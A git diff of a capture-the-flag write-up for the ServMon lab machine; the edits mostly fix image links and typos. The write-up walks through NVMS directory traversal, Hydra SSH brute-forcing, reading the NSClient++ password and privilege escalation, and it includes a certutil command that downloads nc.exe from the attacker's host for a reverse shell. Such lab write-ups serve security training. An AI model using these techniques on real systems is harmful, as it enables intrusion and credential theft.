@@ -117,9 +117,9 @@ Ok interesting. So we know now there is a passwords file on Nathan's desktop, wh
 
 Heading to the site on port 80 we find a NVMS 1000 logon page:
 
-servmon_nvms_logon.png
+![servmon_nvms_logon.png](../assets/servmon_assets/servmon_nvms_logon.png)
 
-We can try the default credentials for NVMS (admin:123456), butt hey don't work. This is confirmed in the 'Notes to do.txt' file:
+We can try the default credentials for NVMS (admin:123456), but they don't work. This is confirmed in the 'Notes to do.txt' file:
 
 ```
 1) Change the password for NVMS - Complete
@@ -129,9 +129,9 @@ Looking for exploits for NVMS I find: https://github.com/AleDiBen/NVMS1000-Explo
 
 We can see the exploit is leveraging a directory traversal vulnerability and exploiting CVE 2019-20085.
 
-Lets give this a shot, and try to retrieve the Passwords.txt file on Nathan's desktop.
+Lets give this a shot and try to retrieve the Passwords.txt file on Nathan's desktop.
 
-servmon_exploit.png
+![servmon_exploit.png](../assets/servmon_assets/servmon_exploit.png)
 
 Nice, that worked!
 
@@ -158,7 +158,7 @@ nathan
 ```
 Lets now use Hydra to brute borce these passwords and see if we can SSH in with any credentials:
 
-servmon_hydra.png
+![servmon_hydra.png](../assets/servmon_assets/servmon_hydra.png)
 
 Nice, Hydra found valid credentials: nadine:L1k3B1gBut7s@W0rk. (HR may want to take a closer look at Nadine with a password like that.)
 
@@ -176,13 +176,13 @@ servmon\nadine
 
 And grab the first flag:
 
-servmon_user.png
+![servmon_user.png](../assets/servmon_assets/servmon_user.png)
 
 ### Privilege Escalation
 
 Trying to load PowerUp.ps1 to the target, we see we'll have some AV to contend with:
 
-servmon_av.png
+![servmon_av.png](../assets/servmon_assets/servmon_av.png)
 
 Manually enumerating the target further I find a NSClient++ folder in Program Files.
 
@@ -190,7 +190,7 @@ Looking at this service I see it runs on port 8443, which is also open on this b
 
 Looking at potential exploits I find: https://www.exploit-db.com/exploits/46802
 
-And see that we can access the service password with the command:
+And see that we can access the service's admin password with the command:
 
 ```
 nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini 
@@ -211,9 +211,9 @@ password = ew2x6SsGTxjRwXOT
 allowed hosts = 127.0.0.1
 ```
 
-Ok cool. Seems like we're on the right track here. The only issue is that we can only access the site as localhost, so we can't just navigate to the site on the web as normal:
+Ok cool. Seems like we're on the right track here. The only issue is that we can only access the site at localhost, so we can't just navigate to the site on the web as normal:
 
-servmon_nope.png
+![servmon_nope.png](../assets/servmon_assets/servmon_nope.png)
 
 We'll need to set up some port forwarding to access the site.
 
@@ -225,7 +225,7 @@ We'll need to set up some port forwarding to access the site.
 
 We can now navigate to the page, but it is extremely buggy and just hangs.
 
-servmon_8443.png
+![servmon_8443.png](../assets/servmon_assets/servmon_8443.png)
 
 Because the exploit found before was very unclear to me, I kept searching for other exploits and found:
 
@@ -235,14 +235,14 @@ This is especially interesting as the GUI is all but unusable, and this bypasses
 
 Looks like the script will take the password provided and execute commands with admin privileges.
 
-The exploit features catching a shell as admin by executing a nc.exe command back to our kali box, but unfortunately the AV/ firewall is preventing me from loading nc.exe:
+The exploit features catching a shell as admin by executing a nc.exe reverse shell command back to our Kali box, but unfortunately the AV/ firewall is preventing me from loading nc.exe:
 
 ```
 nadine@SERVMON C:\temp>certutil -urlcache -split -f "http://10.10.14.60/nc.exe"
 Access is denied.
 ```
 
-So a workaround would be using the exploit to add Nadine to the administrator's group, and then log back in with admin privileges.
+So a workaround could be using the exploit to add Nadine to the administrator's group, and then log back in with admin privileges.
 
 We can do that with:
 ```
@@ -285,7 +285,7 @@ Nice, we can see we are now part of the Administrators group.
 
 Lets grab the last flag:
 
-servmon_root.png
+![servmon_root.png](../assets/servmon_assets/servmon_root.png)
 
 Thanks for following along,
 
